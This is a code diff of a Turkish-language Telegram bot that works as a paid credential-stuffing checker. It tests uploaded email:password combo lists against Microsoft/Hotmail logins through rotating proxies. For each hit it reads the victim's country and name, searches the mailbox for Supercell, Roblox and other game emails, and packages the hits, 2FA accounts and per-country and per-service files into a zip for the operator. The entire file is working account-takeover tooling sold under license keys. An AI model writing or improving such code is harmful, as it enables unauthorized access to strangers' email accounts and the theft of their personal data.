@@ -17,16 +17,15 @@ ADMIN_THREAD = 10
 KEY_FILE = "keys.json"
 USER_FILE = "users.json"
 
-HITS_FILE = "hotmailbothits.txt"
-TWOFA_FILE = "checkerbot2FA.txt"
-ROBLOX_FILE = "robloxbothits.txt"
+HITS_FILE = "all_hits.txt"
+TWOFA_DIR = "2fa"
+COUNTRIES_DIR = "countries"
+KEYWORDS_DIR = "keywords"
 ZIP_FILE = "hotmailgamechecker.zip"
-ULKE_DIR = "hotmail_ulke"
 
 user_proxies = {}
 proxy_waiting = {}
 user_proxy_index = {}
-bekleyen_mod = {}
 
 GAME_EMAILS = {
     "supercell": {"email": "noreply@id.supercell.com", "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
@@ -63,6 +62,21 @@ bekleyen_hesaplar = {}
 
 keys_db = {}
 users_db = {}
+
+FLAG_MAP = {
+    "US": "🇺🇸", "GB": "🇬🇧", "UK": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "DE": "🇩🇪",
+    "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "BR": "🇧🇷", "IN": "🇮🇳", "JP": "🇯🇵",
+    "KR": "🇰🇷", "CN": "🇨🇳", "RU": "🇷🇺", "MX": "🇲🇽", "SA": "🇸🇦", "AE": "🇦🇪",
+    "TR": "🇹🇷", "NL": "🇳🇱", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮",
+    "PL": "🇵🇱", "CZ": "🇨🇿", "GR": "🇬🇷", "PT": "🇵🇹", "IE": "🇮🇪", "CH": "🇨🇭",
+    "AT": "🇦🇹", "BE": "🇧🇪", "LU": "🇱🇺", "IS": "🇮🇸", "NZ": "🇳🇿", "SG": "🇸🇬",
+    "MY": "🇲🇾", "ID": "🇮🇩", "TH": "🇹🇭", "VN": "🇻🇳", "PH": "🇵🇭", "AR": "🇦🇷",
+    "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪", "EG": "🇪🇬", "BS": "🇧🇸", "HK": "🇭🇰",
+}
+
+
+def get_flag(code):
+    return FLAG_MAP.get((code or "").upper(), "🏴")
 
 
 def load_user_proxies(chat_id, content):
@@ -270,7 +284,7 @@ def ataturkparki():
 
 
 # ============================================================
-# ROBLOX FONKSİYONLARI
+# ROBLOX
 # ============================================================
 
 def roblox_gidd(username):
@@ -358,7 +372,6 @@ class marazali:
         self.cid = ""
         self.country = ""
         self.name = ""
-        self.birthdate = "N/A"
         self.gelsinhayatbildigigibi = None
         self.sahteparantezleracmasakin = (
             "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
@@ -506,11 +519,6 @@ class marazali:
                 if "accounts" in d and len(d["accounts"]) > 0:
                     acc = d["accounts"][0]
                     self.country = acc.get("location", "") or "Unknown"
-                    bd = acc.get("birthDay", "")
-                    bm = acc.get("birthMonth", "")
-                    by = acc.get("birthYear", "")
-                    if bd and bm and by:
-                        self.birthdate = f"{by}-{str(bm).zfill(2)}-{str(bd).zfill(2)}"
                 if "names" in d and len(d["names"]) > 0:
                     self.name = d["names"][0].get("displayName", "") or ""
                 return True
@@ -518,7 +526,7 @@ class marazali:
         except:
             return False
 
-    def _tarih_fallback(self, result):
+    def _tarih(self, result):
         date_str = result.get("DateTimeReceived") or result.get("DateTimeLastModified")
         if date_str:
             try:
@@ -587,7 +595,7 @@ class marazali:
                     results = es.get("Results", [])
                     if results:
                         first = results[0]
-                        tarih = self._tarih_fallback(first)
+                        tarih = self._tarih(first)
                         subject = (first.get("Subject", "") or first.get("ConversationTopic", ""))[:80]
                         preview = (first.get("Preview", "") or first.get("BodyPreview", ""))[:80]
                         break
@@ -600,7 +608,7 @@ class marazali:
         except:
             return 0, "N/A", "", ""
 
-    def check(self, tag, mode="hotmail"):
+    def check(self, tag):
         status = self.nihathatipoglu(tag)
         if status != "SUCCESS":
             return status, None
@@ -609,74 +617,99 @@ class marazali:
         if not token:
             return "BAD", None
         self.profil_cek(token)
-        time.sleep(0.5)
+        time.sleep(0.3)
         mesaj_info = {}
-        if mode == "roblox":
-            sayi, tarih, subj, prev = self.search_messages(tag, "roblox", token)
-            mesaj_info["roblox"] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
-        else:
-            for game_key, game_data in GAME_EMAILS.items():
-                sayi, tarih, subj, prev = self.search_messages(tag, game_key, token)
-                mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
-                time.sleep(0.3)
+        for game_key, game_data in GAME_EMAILS.items():
+            sayi, tarih, subj, prev = self.search_messages(tag, game_key, token)
+            mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
+            time.sleep(0.2)
         return "SUCCESS", mesaj_info
 
 
 # ============================================================
-# ÜLKE DOSYALARI + ZIP
+# DOSYA YAZIMI
 # ============================================================
 
-def ulke_dosyasi_yaz(ulke, satir):
+def ulke_yaz(ulke, satir):
     u = (ulke or "Unknown").upper().strip()
     if not u or u == "UNKNOWN" or len(u) > 3:
         u = "Unknown"
+    os.makedirs(COUNTRIES_DIR, exist_ok=True)
     try:
-        os.makedirs(ULKE_DIR, exist_ok=True)
-        with open(f"{ULKE_DIR}/{u}.txt", "a", encoding="utf-8") as f:
+        with open(f"{COUNTRIES_DIR}/{u}.txt", "a", encoding="utf-8") as f:
             f.write(satir + "\n")
     except:
         pass
 
 
-def ulke_zip_olustur():
+def keyword_yaz(servis, satir):
+    os.makedirs(KEYWORDS_DIR, exist_ok=True)
     try:
-        with zipfile.ZipFile(HITS_FILE.replace(".txt", ".zip"), "w", zipfile.ZIP_DEFLATED) as zf:
-            if os.path.isdir(ULKE_DIR):
-                for f in os.listdir(ULKE_DIR):
-                    if f.endswith(".txt"):
-                        path = os.path.join(ULKE_DIR, f)
-                        if os.path.getsize(path) > 0:
-                            zf.write(path, f)
-        return True
+        with open(f"{KEYWORDS_DIR}/{servis}.txt", "a", encoding="utf-8") as f:
+            f.write(satir + "\n")
     except:
-        return False
+        pass
 
 
-def create_zip():
+def ikiFA_yaz(combo):
+    os.makedirs(TWOFA_DIR, exist_ok=True)
+    try:
+        with open(f"{TWOFA_DIR}/2fa.txt", "a", encoding="utf-8") as f:
+            f.write(combo + "\n")
+    except:
+        pass
+
+
+def all_hits_yaz(combo):
+    try:
+        with open(HITS_FILE, "a", encoding="utf-8") as f:
+            f.write(combo + "\n")
+    except:
+        pass
+
+
+def zip_olustur(ulke_sayaci, keyword_sayaci):
+    tarih = datetime.now().strftime('%d-%m-%Y')
     try:
         with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
-            all_files = [HITS_FILE, TWOFA_FILE, ROBLOX_FILE]
-            for game_key, game_data in GAME_EMAILS.items():
-                if game_data["file"] not in all_files:
-                    all_files.append(game_data["file"])
-            for f in all_files:
-                if os.path.exists(f) and os.path.getsize(f) > 0:
-                    zf.write(f, os.path.basename(f))
+            if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
+                zf.write(HITS_FILE, "all_hits.txt")
+            if os.path.isdir(TWOFA_DIR):
+                for f in os.listdir(TWOFA_DIR):
+                    if f.endswith(".txt"):
+                        p = os.path.join(TWOFA_DIR, f)
+                        if os.path.getsize(p) > 0:
+                            zf.write(p, f"2fa/{f}")
+            if os.path.isdir(COUNTRIES_DIR):
+                for f in os.listdir(COUNTRIES_DIR):
+                    if f.endswith(".txt"):
+                        p = os.path.join(COUNTRIES_DIR, f)
+                        if os.path.getsize(p) > 0:
+                            kod = f.replace(".txt", "")
+                            n = ulke_sayaci.get(kod, 0)
+                            zf.write(p, f"countries/{kod} ({n} hit) ({tarih}).txt")
+            if os.path.isdir(KEYWORDS_DIR):
+                for f in os.listdir(KEYWORDS_DIR):
+                    if f.endswith(".txt"):
+                        p = os.path.join(KEYWORDS_DIR, f)
+                        if os.path.getsize(p) > 0:
+                            svc = f.replace(".txt", "")
+                            n = keyword_sayaci.get(svc, 0)
+                            zf.write(p, f"keywords/{svc} ({n} hit) ({tarih}).txt")
         return True
     except:
         return False
 
 
-def benferooolum():
-    all_files = [HITS_FILE, TWOFA_FILE, ROBLOX_FILE]
-    for game_key, game_data in GAME_EMAILS.items():
-        if game_data["file"] not in all_files:
-            all_files.append(game_data["file"])
-    for f in all_files:
-        with open(f, 'w', encoding='utf-8') as fh:
+def klasorleri_temizle():
+    try:
+        with open(HITS_FILE, 'w', encoding='utf-8') as f:
             pass
-    if os.path.isdir(ULKE_DIR):
-        shutil.rmtree(ULKE_DIR, ignore_errors=True)
+    except:
+        pass
+    for d in [TWOFA_DIR, COUNTRIES_DIR, KEYWORDS_DIR]:
+        if os.path.isdir(d):
+            shutil.rmtree(d, ignore_errors=True)
 
 
 # ============================================================
@@ -705,8 +738,8 @@ def ana_menu(chat_id):
 
     keyboard = {
         "inline_keyboard": [
-            [{"text": "🚀 Hotmail Check", "callback_data": "hotmail_mod"}],
-            [{"text": "🎮 Roblox Check", "callback_data": "roblox_mod"}],
+            [{"text": "🚀 Check", "callback_data": "baslat"},
+             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
             [{"text": "📊 Status", "callback_data": "durum"},
              {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
             [{"text": "💰 Prices", "callback_data": "fiyatlar"},
@@ -724,23 +757,8 @@ def ana_menu(chat_id):
     if str(chat_id) == str(ADMIN_ID):
         text += f"║     👑 ADMIN PANEL 👑                       ║\n"
     text += f"╚══════════════════════════════════════════════╝\n\n"
-    text += f"📋 Plan: {plan}\n"
-    text += f"⏳ Remaining: {kalan}\n"
-    text += f"⚡ Thread: {thread}\n"
+    text += f"📋 Plan: {plan}\n⏳ Remaining: {kalan}\n⚡ Thread: {thread}\n"
     send_message(chat_id, text, keyboard)
-
-
-def mod_menu(chat_id, mode):
-    emoji = "🚀" if mode == "hotmail" else "🎮"
-    title = "HOTMAIL CHECK" if mode == "hotmail" else "ROBLOX CHECK"
-    keyboard = {
-        "inline_keyboard": [
-            [{"text": "📄 Single Scan", "callback_data": f"single_{mode}"}],
-            [{"text": "📂 Multi Scan", "callback_data": f"multi_{mode}"}],
-            [{"text": "🔙 Geri", "callback_data": "main_menu"}],
-        ]
-    }
-    send_message(chat_id, f"{emoji} {title}\n\nSeçim yap:", keyboard)
 
 
 def proxy_menu(chat_id):
@@ -791,12 +809,10 @@ def durum_menu(chat_id):
         kalan_hak = daily_limit - daily_used if daily_limit > 0 else "Unlimited"
         proxy_count = len(user_proxies.get(str(chat_id), []))
         send_message(chat_id,
-                     f"📊 STATUS PANEL\n\n📋 Plan: {plan_info['name']}\n"
-                     f"⏳ Remaining: {kalan}\n"
+                     f"📊 STATUS PANEL\n\n📋 Plan: {plan_info['name']}\n⏳ Remaining: {kalan}\n"
                      f"📊 Today: {daily_used}/{daily_limit if daily_limit > 0 else '∞'}\n"
                      f"📂 Single Scan: {single_limit if single_limit > 0 else '∞'}\n"
-                     f"⚡ Thread: {plan_info['thread']}\n📡 Proxies: {proxy_count}\n\n"
-                     f"━━━━━━━━━━━━━━━━━━\nRemaining today: {kalan_hak}")
+                     f"⚡ Thread: {plan_info['thread']}\n📡 Proxies: {proxy_count}")
 
 
 def key_menu(chat_id):
@@ -884,9 +900,9 @@ def bakim(chat_id):
 # TARAMA
 # ============================================================
 
-def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
+def tarama_yap(chat_id, accounts, dosya_adi):
     global ADMIN_THREAD
-    benferooolum()
+    klasorleri_temizle()
 
     plan_name = get_user_plan(chat_id)
     plan_info = get_plan_info(plan_name)
@@ -897,13 +913,13 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
     tarama_durdur[chat_id] = False
 
     egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
-
+    keyword_sayaci = {}
+    ulke_sayaci = {}
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(thread_sayisi)
 
-    baslik = "📊 Scanning..." if mode == "hotmail" else "🎮 Roblox Scanning..."
     sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                         data={"chat_id": chat_id, "text": baslik}, timeout=15).json()
+                         data={"chat_id": chat_id, "text": "⚡️ Tarama Başlıyor..."}, timeout=15).json()
     progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None
 
     def check_one(combo):
@@ -915,14 +931,14 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
             proxy_str = get_user_proxy(chat_id)
             formatted_proxy = format_proxy(proxy_str) if proxy_str else None
             c = marazali(email, password, formatted_proxy)
-            status, mesaj_info = c.check(tag, mode=mode)
+            status, mesaj_info = c.check(tag)
             with lock:
                 if status == "SUCCESS":
                     egriegri["hit"] += 1
                     ulke = c.country or "Unknown"
                     isim = c.name or ""
-                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
-                        f.write(combo + "\n")
+                    ulke_sayaci[ulke] = ulke_sayaci.get(ulke, 0) + 1
+                    all_hits_yaz(combo)
                     if mesaj_info:
                         for game_key, game_data in mesaj_info.items():
                             sayi = game_data.get("sayi", 0)
@@ -930,7 +946,8 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
                                 tarih = game_data.get("tarih", "N/A")
                                 subj = game_data.get("subject", "")
                                 prev = game_data.get("preview", "")
-                                if mode == "roblox" and game_key == "roblox":
+                                keyword_sayaci[game_key] = keyword_sayaci.get(game_key, 0) + 1
+                                if game_key == "roblox":
                                     kullanici = roblox_eruu(prev + " " + subj)
                                     if kullanici:
                                         rd = roblox_rlll(kullanici, formatted_proxy)
@@ -943,23 +960,18 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
                                         satir = (f"{combo} | {ulke} | {isim} | 🎲 ROBLOX | "
                                                  f"Username = ??? | Friends = ??? | Banned = ??? | "
                                                  f"Created = ??? | Profile = ??? | Wearing = []")
-                                    with open(ROBLOX_FILE, 'a', encoding='utf-8') as f:
-                                        f.write(satir + "\n")
                                 else:
-                                    lbl = GAME_EMAILS[game_key]["label"]
+                                    lbl = game_data["label"]
                                     satir = f"{combo} | {ulke} | {isim} | {lbl} Messages: {sayi} | Last: {tarih}"
                                     if subj:
                                         satir += f" | Subject: {subj}"
                                     if prev:
                                         satir += f" | Preview: {prev}"
-                                    with open(game_data["file"], 'a', encoding='utf-8') as f:
-                                        f.write(satir + "\n")
-                                    ulke_dosyasi_yaz(ulke, satir)
-                                    print(f"✅ {satir}", flush=True)
+                                keyword_yaz(game_key, satir)
+                                ulke_yaz(ulke, satir)
                 elif status == "2FA":
                     egriegri["twofa"] += 1
-                    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
-                        f.write(combo + "\n")
+                    ikiFA_yaz(combo)
                 else:
                     egriegri["bad"] += 1
         except Exception:
@@ -972,7 +984,7 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
 
     def progress_updater():
         while True:
-            time.sleep(3)
+            time.sleep(4)
             if tarama_durdur.get(chat_id, False):
                 break
             with lock:
@@ -984,15 +996,27 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
                 twofa = egriegri["twofa"]
                 bad = egriegri["bad"]
                 errors = egriegri["errors"]
+                kw_copy = dict(keyword_sayaci)
+                ulke_copy = dict(ulke_sayaci)
             elapsed = time.time() - baslangic
             yuzde = (checked / dogrudogru) * 100 if dogrudogru > 0 else 0
             cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
-            filled = int(20 * checked // dogrudogru) if dogrudogru > 0 else 0
-            bar = '█' * filled + '░' * (20 - filled)
-            m = f"📊 SCANNING ({'HOTMAIL' if mode == 'hotmail' else 'ROBLOX'})\n\n"
-            m += f"📁 File: {dosya_adi}\n📊 Progress: {checked}/{dogrudogru} ({yuzde:.1f}%)\n"
-            m += f"{bar}\n\n✅ HIT: {hit}\n❌ BAD: {bad}\n🔐 2FA: {twofa}\n⚠️ ERRORS: {errors}\n\n"
-            m += f"⏰ Elapsed: {int(elapsed)}s\n⚡ CPM: {int(cpm)}\n\nStop: /stop"
+            m = f"⚡️ Tarama Devam Ediyor!\n\n"
+            m += f"📁 Dosya: {dosya_adi}\n📊 İlerleme: {checked}/{dogrudogru} (%{yuzde:.0f})\n\n"
+            m += f"✔️ HIT: {hit}\n🔒 2FA: {twofa}\n❌ BAD: {bad}\n‼️ ERROR: {errors}\n\n"
+            m += f"⏰ Süre: {int(elapsed)} sn\n⚡️ Ort. CPM: {int(cpm)}\n\n"
+            if kw_copy:
+                m += "🔖 KEYWORDS:\n"
+                for k, v in sorted(kw_copy.items(), key=lambda x: -x[1]):
+                    lbl = GAME_EMAILS[k]["label"] if k in GAME_EMAILS else k
+                    m += f"🎯 {lbl}: {v} Hit (%{int(v/hit*100) if hit else 0})\n"
+                m += "\n"
+            if ulke_copy:
+                m += "🌐 COUNTRIES:\n"
+                for k, v in sorted(ulke_copy.items(), key=lambda x: -x[1])[:8]:
+                    m += f"{get_flag(k)} {k}: {v} Hit (%{int(v/hit*100) if hit else 0})\n"
+                m += "\n"
+            m += "🛑 /stop ile durdurabilirsiniz"
             if progress_message_id:
                 try:
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
@@ -1019,15 +1043,17 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
     elapsed = time.time() - baslangic
     durdu = tarama_durdur.get(chat_id, False)
 
-    ulke_zip_olustur()
-    zip_olustu = create_zip()
+    zip_olustu = zip_olustur(ulke_sayaci, keyword_sayaci)
 
-    stats = f"{'⏹️ STOPPED' if durdu else '✅ COMPLETED'} ({int(elapsed)}s)\n\n"
-    stats += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    stats += f"🔱 Total: {dogrudogru}\n✅ Hit: {egriegri['hit']}\n"
-    stats += f"❌ Bad: {egriegri['bad']}\n🔐 2FA: {egriegri['twofa']}\n"
-    stats += f"\n📦 Sending result file..."
-    send_message(chat_id, stats)
+    ozet = f"✔️ {egriegri['hit']}x Hotmail Hit\n\n"
+    ozet += f"📊 Toplam Hit: {egriegri['hit']}\n"
+    for k, v in sorted(keyword_sayaci.items(), key=lambda x: -x[1]):
+        lbl = GAME_EMAILS[k]["label"] if k in GAME_EMAILS else k
+        ozet += f"🎯 {lbl} Hit: {v}\n"
+    ozet += f"🌐 Toplam Ülke: {len(ulke_sayaci)}\n"
+    ozet += f"🔒 2FA: {egriegri['twofa']}\n\n"
+    ozet += f"🔥 Hit By : @imkansizligim"
+    send_message(chat_id, ozet)
 
     if zip_olustu:
         send_document(chat_id, ZIP_FILE)
@@ -1040,7 +1066,7 @@ def tarama_yap(chat_id, accounts, dosya_adi, mode="hotmail"):
 
 
 # ============================================================
-# TELEGRAM BOT DÖNGÜSÜ
+# TELEGRAM DÖNGÜSÜ
 # ============================================================
 
 def telegram_bot():
@@ -1076,19 +1102,11 @@ def telegram_bot():
                             user_proxy_index.pop(user_id, None)
                             send_message(chat_id, "✅ Proxies removed.")
                             proxy_menu(chat_id)
-                        elif data_cb == "hotmail_mod":
-                            mod_menu(chat_id, "hotmail")
-                        elif data_cb == "roblox_mod":
-                            mod_menu(chat_id, "roblox")
-                        elif data_cb.startswith("single_"):
-                            mode = data_cb.split("_", 1)[1]
-                            bekleyen_mod[chat_id] = mode
-                            send_message(chat_id, f"📂 Send your combo file ({mode.upper()} mode).")
-                        elif data_cb.startswith("multi_"):
-                            mode = data_cb.split("_", 1)[1]
-                            bekleyen_mod[chat_id] = mode
+                        elif data_cb == "baslat":
+                            send_message(chat_id, "📂 Send your combo file. Scanning will start automatically.")
+                        elif data_cb == "multi_start":
+                            send_message(chat_id, "📂 Send your combo files. Type /bitti when done.")
                             multi_bekleyen[chat_id] = []
-                            send_message(chat_id, f"📂 Send your combo files ({mode.upper()} mode). Type /bitti when done.")
                         elif data_cb == "key_giris":
                             send_message(chat_id, "🔑 To enter key: /key LICENSE_KEY")
                         elif data_cb == "key_olustur":
@@ -1134,10 +1152,9 @@ def telegram_bot():
                         if bakim_modu and str(chat_id) != str(ADMIN_ID):
                             send_message(chat_id, "🔧 Maintenance mode.")
                             continue
-                        mode = bekleyen_mod.get(chat_id, "hotmail")
                         if chat_id in multi_bekleyen:
                             multi_bekleyen[chat_id].append((file_id, file_name))
-                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])}. Type /bitti")
+                            send_message(chat_id, f"📂 {file_name} added. Total: {len(multi_bekleyen[chat_id])}. /bitti")
                         else:
                             send_message(chat_id, "📂 File received, downloading...")
                             content = download_file(file_id)
@@ -1154,8 +1171,8 @@ def telegram_bot():
                             plan_info = get_plan_info(plan_name)
                             single_limit = plan_info["single_limit"]
                             if single_limit > 0 and len(accounts) > single_limit:
-                                bekleyen_hesaplar[chat_id] = {"accounts": accounts[single_limit:], "file_name": file_name, "mode": mode}
-                                send_message(chat_id, f"⚠️ First {single_limit} will be scanned. Remaining: {len(accounts) - single_limit}. /devam")
+                                bekleyen_hesaplar[chat_id] = {"accounts": accounts[single_limit:], "file_name": file_name}
+                                send_message(chat_id, f"⚠️ First {single_limit}. Remaining: {len(accounts) - single_limit}. /devam")
                                 accounts = accounts[:single_limit]
                             if plan_name == "free":
                                 remaining = get_remaining_daily(chat_id)
@@ -1163,15 +1180,15 @@ def telegram_bot():
                                     send_message(chat_id, "❌ DAILY LIMIT REACHED")
                                     continue
                                 if len(accounts) > remaining:
-                                    bekleyen_hesaplar[chat_id] = {"accounts": accounts[remaining:], "file_name": file_name, "mode": mode}
-                                    send_message(chat_id, f"⚠️ First {remaining} will be scanned. Remaining: {len(accounts) - remaining}")
+                                    bekleyen_hesaplar[chat_id] = {"accounts": accounts[remaining:], "file_name": file_name}
+                                    send_message(chat_id, f"⚠️ First {remaining}. Remaining: {len(accounts) - remaining}")
                                     accounts = accounts[:remaining]
-                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning ({mode})...")
+                            send_message(chat_id, f"🔱 {len(accounts)} accounts found. Scanning...")
                             user_id = str(chat_id)
                             if user_id in users_db:
                                 users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(accounts)
                                 save_db()
-                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name, mode), daemon=True)
+                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                             t.start()
                     elif msg.get("text") == "/start":
                         ana_menu(chat_id)
@@ -1194,14 +1211,13 @@ def telegram_bot():
                         if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
                             kalan = bekleyen_hesaplar[chat_id]["accounts"]
                             fname = bekleyen_hesaplar[chat_id]["file_name"]
-                            mode = bekleyen_hesaplar[chat_id].get("mode", "hotmail")
                             del bekleyen_hesaplar[chat_id]
                             send_message(chat_id, f"🔱 Continuing with {len(kalan)} accounts...")
                             user_id = str(chat_id)
                             if user_id in users_db:
                                 users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(kalan)
                                 save_db()
-                            t = threading.Thread(target=tarama_yap, args=(chat_id, kalan, fname, mode), daemon=True)
+                            t = threading.Thread(target=tarama_yap, args=(chat_id, kalan, fname), daemon=True)
                             t.start()
                         else:
                             send_message(chat_id, "❌ No remaining accounts.")
@@ -1251,7 +1267,6 @@ def telegram_bot():
                                 duyuru(chat_id, m)
                     elif msg.get("text") == "/bitti":
                         if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
-                            mode = bekleyen_mod.get(chat_id, "hotmail")
                             send_message(chat_id, "📂 Merging files...")
                             tum = []
                             for fid, fname in multi_bekleyen[chat_id]:
@@ -1265,12 +1280,12 @@ def telegram_bot():
                                 send_message(chat_id, "❌ No valid accounts.")
                                 del multi_bekleyen[chat_id]
                                 continue
-                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning ({mode})...")
+                            send_message(chat_id, f"🔱 Total {len(benzersiz)} accounts. Scanning...")
                             user_id = str(chat_id)
                             if user_id in users_db:
                                 users_db[user_id]["daily_used"] = users_db[user_id].get("daily_used", 0) + len(benzersiz)
                                 save_db()
-                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo", mode), daemon=True)
+                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                             t.start()
                             del multi_bekleyen[chat_id]
                         else:
